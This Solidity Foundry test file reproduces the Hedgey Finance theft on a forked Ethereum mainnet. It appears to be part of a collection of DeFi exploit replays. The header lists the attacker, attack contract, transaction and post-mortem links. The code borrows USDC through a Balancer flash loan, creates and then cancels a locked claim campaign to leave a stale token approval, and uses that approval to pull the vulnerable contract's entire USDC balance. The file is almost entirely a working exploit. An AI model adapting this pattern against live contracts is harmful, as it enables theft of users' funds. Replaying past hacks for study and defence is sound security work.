// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 48M USD
// Attacker : https://etherscan.io/address/0xDed2b1a426E1b7d415A40Bcad44e98F47181dda2
// Attack Contract : https://etherscan.io/address/0xC793113F1548B97E37c409f39244EE44241bF2b3
// Vulnerable Contract : https://etherscan.io/address/0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511
// Attack Tx : https://etherscan.io/tx/0x2606d459a50ca4920722a111745c2eeced1d8a01ff25ee762e22d5d4b1595739

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511#code

// @Analysis
// Post-mortem : https://medium.com/@CUBE3AI/hedgey-finance-hack-detected-by-cube3-ai-minutes-before-exploit-1f500e7052d4
// Twitter Guy : https://twitter.com/Cube3AI/status/1781294512716820918
// Hacking God : 

enum TokenLockup {
    Unlocked,
    Locked,
    Vesting
  }

struct Campaign {
    address manager;
    address token;
    uint256 amount;
    uint256 end;
    TokenLockup tokenLockup;
    bytes32 root;
  }

struct Donation {
    address tokenLocker;
    uint256 amount;
    uint256 rate;
    uint256 start;
    uint256 cliff;
    uint256 period;
}

struct ClaimLockup {
    address tokenLocker;
    uint256 start;
    uint256 cliff;
    uint256 period;
    uint256 periods;
}

interface IClaimCampaigns{

    function createLockedCampaign(
        bytes16 id,
        Campaign memory campaign,
        ClaimLockup memory claimLockup,
        Donation memory donation
    ) external;

    function cancelCampaign(bytes16 campaignId) external;
}


contract HedgeyFinance is Test {
    uint256 blocknumToForkFrom = 19687890-1;

    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // HedgeyFinance
    IClaimCampaigns private constant HedgeyFinance = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);

    // Stolen money 1.305.000 USD
    uint256 loan = 1_305_000 * 1e6;

    function setUp() public {

        vm.createSelectFork("mainnet", blocknumToForkFrom);
        
        vm.label(address(USDC), "USDC");
        vm.label(address(BalancerVault), "BalancerVault");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        emit log_named_decimal_uint("Attacker USDC balance before exploit", address(this).balance, 18);

        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loan;

        BalancerVault.flashLoan(address(this), tokens, amounts, "");

        // At this point we have an Approval
        uint256 HedgeyFinance_balance = USDC.balanceOf(address(HedgeyFinance));
        USDC.transferFrom(address(HedgeyFinance), address(this), HedgeyFinance_balance);

        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory fees,
        bytes memory
    ) external payable {
        // Start new campage
        USDC.approve(address(HedgeyFinance), loan);

        // Id
        bytes16 campaign_id = 0x00000000000000000000000000000001;

        Campaign memory campaign;
        campaign.manager = address(this);
        campaign.token = address(USDC);
        campaign.amount = loan;
        campaign.end = 3133666800;
        campaign.tokenLockup = TokenLockup.Locked;
        campaign.root = ""; // 0x0000000000000000000000000000000000000000000000000000000000000000

        ClaimLockup memory claimLockup;
        claimLockup.tokenLocker = address(this);
        claimLockup.start = 0;
        claimLockup.cliff = 0;
        claimLockup.period = 0;
        claimLockup.periods = 0;

        Donation memory donation;
        donation.tokenLocker = address(this);
        donation.amount = 0;
        donation.rate = 0;
        donation.start = 0;
        donation.start = 0;
        donation.cliff = 0;
        donation.period = 0;

        HedgeyFinance.createLockedCampaign(
            campaign_id, 
            campaign, 
            claimLockup,
            donation);

        HedgeyFinance.cancelCampaign(campaign_id);

        // pay back the FlashLoan
        USDC.transfer(address(BalancerVault), loan);
    }

}
